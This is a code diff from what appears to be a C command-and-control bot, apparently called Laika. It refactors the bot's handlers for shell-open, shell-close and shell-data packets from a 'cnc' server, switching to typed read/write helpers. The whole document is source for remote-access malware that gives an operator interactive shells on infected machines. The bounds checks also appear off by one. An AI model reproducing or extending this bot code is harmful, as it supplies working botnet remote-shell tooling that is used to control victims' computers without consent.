@@ -28,7 +28,7 @@ void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell)
 
     /* tell cnc shell is closed */
     laikaS_startOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
-    laikaS_writeInt(&bot->peer->sock, &id, sizeof(uint32_t));
+    laikaS_writeu32(&bot->peer->sock, id);
     laikaS_endOutPacket(bot->peer);
 
     laikaB_freeRAWShell(bot, shell);
@@ -51,9 +51,9 @@ void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     uint32_t id;
     uint16_t cols, rows;
 
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
-    laikaS_readInt(&peer->sock, &cols, sizeof(uint16_t));
-    laikaS_readInt(&peer->sock, &rows, sizeof(uint16_t));
+    id = laikaS_readu32(&peer->sock);
+    cols = laikaS_readu16(&peer->sock);
+    rows = laikaS_readu16(&peer->sock);
 
     /* check if shell is already open */
     if (id > LAIKA_MAX_SHELLS || (shell = bot->shells[id]))
@@ -62,7 +62,7 @@ void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     /* open shell & if we failed, tell cnc */
     if ((shell = laikaB_newShell(bot, cols, rows, id)) == NULL) {
         laikaS_startOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
-        laikaS_writeInt(&bot->peer->sock, &id, sizeof(uint32_t));
+        laikaS_writeu32(&bot->peer->sock, id);
         laikaS_endOutPacket(bot->peer);
     }
 }
@@ -73,7 +73,7 @@ void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     struct sLaika_shell *shell;
     uint32_t id;
 
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
+    id = laikaS_readu32(&peer->sock);
 
     /* check if shell is not running */
     if (id > LAIKA_MAX_SHELLS || !(shell = bot->shells[id]))
@@ -91,7 +91,7 @@ void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     uint32_t id;
 
     /* read data buf */
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t));
+    id = laikaS_readu32(&peer->sock);
     laikaS_read(&peer->sock, buf, sz - sizeof(uint32_t));
 
     /* sanity check shell */
